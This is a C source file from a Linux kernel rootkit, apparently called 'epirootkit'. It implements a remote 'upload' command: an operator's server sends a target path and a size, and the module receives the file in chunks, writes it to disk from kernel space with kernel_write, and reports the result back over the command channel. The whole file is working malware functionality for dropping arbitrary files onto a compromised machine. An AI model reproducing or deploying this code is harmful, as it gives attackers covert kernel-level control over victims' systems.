#include "upload.h"

#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "epirootkit.h"

bool receiving_file = false;
char *upload_buffer = NULL;
char *upload_path = NULL;
long upload_size = 0;
long upload_received = 0;

int handle_upload_chunk(const char *data, size_t len, enum Protocol protocol) {
    size_t to_copy;
    size_t i;

    DBG_MSG("CHUNK SIZE : %zu\n", len);

    if (!receiving_file || !upload_buffer) {
        ERR_MSG("handle_upload_chunk: not receiving file, aborting chunk\n");
        return -EINVAL;
    }

    if (upload_received + len > upload_size)
        to_copy = upload_size - upload_received;
    else
        to_copy = len;

    for (i = 0; i < to_copy; i++) {
        upload_buffer[upload_received + i] = data[i];
    }
    upload_received += to_copy;

    DBG_MSG("handle_upload_chunk: received %zu bytes (%ld/%ld)\n", to_copy,
            upload_received, upload_size);

    if (upload_received >= upload_size) {
        DBG_MSG("handle_upload_chunk: full upload received, writing to file\n");

        struct file *filp =
            filp_open(upload_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (IS_ERR(filp)) {
            ERR_MSG("handle_upload_chunk: failed to open %s\n", upload_path);
            send_to_server(protocol, "Failed to open file.\n");
        }
        else {
            ssize_t written =
                kernel_write(filp, upload_buffer, upload_size, &filp->f_pos);
            if (written != upload_size) {
                ERR_MSG("handle_upload_chunk: partial write (%zd/%ld)\n", written,
                        upload_size);
                send_to_server(protocol, "Partial or failed file write.\n");
            }
            else {
                DBG_MSG("handle_upload_chunk: wrote %ld bytes to %s\n", upload_size,
                        upload_path);
                send_to_server(protocol, "File written successfully.\n");
            }
            filp_close(filp, NULL);
        }

        vfree(upload_buffer);
        kfree(upload_path);
        upload_buffer = NULL;
        upload_path = NULL;
        receiving_file = false;
    }

    return 0;
}

int start_upload(const char *path, long size) {
    DBG_MSG("start_upload: path=%s, size=%ld\n", path, size);

    if (receiving_file)
        return -EBUSY;

    upload_path = kstrdup(path, GFP_KERNEL);
    if (!upload_path)
        return -ENOMEM;

    upload_path[strcspn(upload_path, "\n")] = '\0';

    upload_buffer = vmalloc(size);
    if (!upload_buffer) {
        kfree(upload_path);
        return -ENOMEM;
    }

    upload_size = size;
    upload_received = 0;
    receiving_file = true;

    DBG_MSG("start_upload: setup complete\n");
    return 0;
}

int upload_handler(char *args, enum Protocol protocol) {
    if (protocol != TCP) {
        DBG_MSG("warning: upload will be over TCP.\n");
    }

    if (!args) {
        send_to_server(protocol, "Usage: upload <remote_path> <size>\n");
        return -EINVAL;
    }

    char *path_str = strsep(&args, " ");
    char *size_str = args;

    if (!path_str || !size_str) {
        send_to_server(protocol, "Usage: upload <remote_path> <size>\n");
        return -EINVAL;
    }

    long size;
    if (kstrtol(size_str, 10, &size) < 0 || size <= 0) {
        send_to_server(protocol, "Invalid file size.\n");
        return -EINVAL;
    }

    int ret = start_upload(path_str, size);
    if (ret < 0) {
        send_to_server(protocol, "Failed to initiate upload.\n");
        return ret;
    }

    send_to_server(protocol, "READY");
    return 0;
}